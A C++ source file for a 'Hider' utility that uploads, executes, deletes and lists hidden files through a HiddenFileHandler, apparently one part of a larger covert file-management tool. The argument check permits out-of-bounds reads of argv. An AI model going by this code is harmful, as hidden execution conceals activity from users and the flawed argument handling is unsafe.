#include "Hider.h"
#include "../ManegerAndHider/encoding.h"
#include "../Maneger/responce.h"

Hider::Hider() : handel(HiddenFileHandler()) {}



// argv[] = {fncode, uploadLen, strParam};
uint Hider::manage_files(int argc, char* argv[])
{
	std::string line;
	if (argc < 2) {
		return HIDER_NO_ARGUMENTS_ERROR;
	}
	uint32_t fncode = decodeInt(std::string(argv[1]));
	uint32_t uploadLen = decodeInt(std::string(argv[2]));
	std::string stringParam = decodeStr(std::string(argv[3]));

	// TODO better Status handling
	responce res_upload = {.dataLen = 0, .status = SUCCSESS};
	responce res_run = {.dataLen = 0, .status = SUCCSESS};
	responce res_delete = {.dataLen = 0, .status = SUCCSESS};

	if (fncode & HIDDEN_UPLOAD)
	{
		std::cerr << "start hidden uploading\n";
		res_upload.status = handel.writeFile(stringParam, uploadLen);
		std::cerr << "res_upload: " << res_upload.status << std::endl;

	}
	if ((fncode & HIDDEN_RUN) && res_upload.status == SUCCSESS) {
		std::cerr << "start hidden run\n";
		res_run.status = handel.runFile(stringParam);
		std::cerr << "res_run: " << res_run.status << std::endl;
	}

	if ((fncode & HIDDEN_DELETE) && res_upload.status == SUCCSESS) {
		std::cerr << "start hidden delete\n";
		res_delete.status = handel.deleteFile(stringParam);
		std::cerr << "res_delete: " << res_delete.status << std::endl;
	}

	write(STDOUT_FILENO, &res_upload, sizeof(res_upload));
	write(STDOUT_FILENO, &res_run, sizeof(res_run));
	write(STDOUT_FILENO, &res_delete, sizeof(res_delete));


	if (fncode & HIDDEN_LIST) {
		handel.listFiles();
	}


	return EXIT_SUCCESS;
}


int main(int argc, char** argv) {
	std::cerr << "start hider\n";
	
	Hider hider = Hider();	
	return hider.manage_files(argc, argv);
}

